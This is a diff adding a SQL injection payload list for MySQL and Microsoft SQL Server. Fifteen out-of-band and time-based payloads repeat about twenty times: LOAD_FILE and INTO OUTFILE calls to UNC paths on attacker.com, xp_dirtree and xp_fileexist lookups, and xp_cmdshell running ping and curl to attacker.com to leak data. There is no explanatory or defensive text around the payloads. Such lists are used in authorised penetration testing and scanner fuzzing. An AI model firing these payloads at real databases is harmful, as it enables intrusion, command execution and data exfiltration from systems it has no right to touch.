@@ -1,0 +1,300 @@
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
